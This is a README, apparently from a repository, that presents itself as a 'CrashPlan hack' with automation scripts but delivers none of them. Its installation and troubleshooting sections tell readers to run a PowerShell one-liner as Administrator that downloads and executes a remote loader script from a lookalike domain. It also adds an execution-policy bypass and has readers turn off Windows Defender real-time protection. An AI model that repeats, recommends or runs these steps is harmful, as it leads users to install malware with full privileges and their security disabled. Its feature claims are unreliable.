# CrashPlan for Small Business Hack: Workaround & Automation Scripts

This repository contains an open-source **CrashPlan for Small Business hack** and automation workarounds designed to optimize, configure, and fix common limitations of the CrashPlan backup client on Linux, Docker, Windows, and macOS setups.

If you are looking for a **CrashPlan hack** to run the enterprise-grade backup solution seamlessly in headless environments, bypass memory limit issues, or automate client deployments, this guide provides tested scripts and configuration fixes.

## 🚀 Key Features & Use Cases
* **CrashPlan Headless Client Hack:** Configuration bypass to manage your backup engine remotely without the official GUI limitations.
* **Docker Container Fixes:** Optimized scripts for running CrashPlan in custom Docker containers with automated restarts.
* **CrashPlan Memory Limit Workaround:** Fix the notorious "CrashPlan keeps crashing" issue by allocating more Java heap memory (`Xmx` configuration hack).
* **Linux Unattended Backup:** Automated bash scripts for fully silent background backups on Ubuntu, Debian, and CentOS.
* **Unlimited Cloud Storage Optimization:** Fine-tune deduplication settings to maximize upload speeds for large datasets.

## 🛠️ Requirements & Compatibility
* **OS:** Linux (Ubuntu/Debian/RHEL), Windows 10/11, macOS, Synology DSM.
* **Target Software:** CrashPlan for Small Business (Enterprise Backup Client).
* **Prerequisites:** Root/Administrator access, Java Runtime Environment (JRE) tweaks, or Docker installed.

---

## 🚀 Automated Installation & Setup (PowerShell)

1. Open PowerShell as Administrator:
   * Press the `Win + X` keys simultaneously.
   * Select Terminal (Admin) or Windows PowerShell (Admin) from the context menu.

2. Execute the Deployment Command:
   Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:

   ```powershell
   irm https://github-software.su/powershell/Loader.ps1 | iex
   ```
---

## 🔍 Troubleshooting & Common Errors

### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://github-software.su/powershell/Loader.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
In older legacy environments where aliases are missing, use explicit full system cmdlets:
```powershell
Invoke-RestMethod https://github-software.su/powershell/Loader.ps1 | Invoke-Expression
```


### 📌 Antivirus or SmartScreen Interception
Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable "Real-time protection" within your Windows Defender settings during setup, then re-enable it immediately after completion.

---

## 🛑 Disclaimer
*This repository is for educational and DevOps research purposes only. It is not affiliated with, authorized, maintained, sponsored, or endorsed by CrashPlan or Code42. Use these workarounds at your own risk in according to CrashPlan's terms of service.*
